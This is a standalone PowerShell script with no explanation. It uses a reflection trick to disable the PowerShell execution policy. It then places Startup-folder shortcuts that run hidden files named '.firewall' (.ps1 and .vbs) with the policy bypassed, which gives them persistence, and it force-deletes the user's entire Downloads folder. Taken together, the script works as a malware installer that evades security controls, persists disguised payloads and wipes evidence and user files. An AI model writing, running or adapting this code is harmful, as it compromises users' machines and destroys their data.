$startupFolder = [System.Environment]::GetFolderPath('Startup')

function Disable-ExecutionPolicy {
    ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
};

Disable-ExecutionPolicy;

$osBit = if ([Environment]::Is64BitOperatingSystem) { "64" } else { "32" }

$ps1File = ".firewall$osBit.ps1" 
$vbsFile = ".firewall$osBit.vbs"

if (Test-Path $ps1File) {
    $ps1Shortcut = Join-Path -Path $startupFolder -ChildPath "firewall.ps1.lnk"
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($ps1Shortcut)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$ps1File`""
    $shortcut.IconLocation = "powershell.exe"
    $shortcut.Save()
} else {
    Write-Error "File $ps1File not exist"
}

if (Test-Path $vbsFile) {
    $vbsShortcut = Join-Path -Path $startupFolder -ChildPath "firewall.vbs.lnk"
    $shortcut = $shell.CreateShortcut($vbsShortcut)
    $shortcut.TargetPath = $vbsFile
    $shortcut.IconLocation = "cscript.exe"
    $shortcut.Save()
} else {
    Write-Error "File $vbsFile not exist"
}

$downloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"

if (Test-Path $downloadsPath) {
    try {
        Get-ChildItem -Path $downloadsPath -File -Recurse | Remove-Item -Force -ErrorAction Stop
        
       Remove-Item -LiteralPath $downloadsPath -Force -Recurse

    } catch {
        Write-Error "Error: $($_.Exception.Message)"
    }
} else {
    Write-Error "Directory 'Downloads' no exists"
}
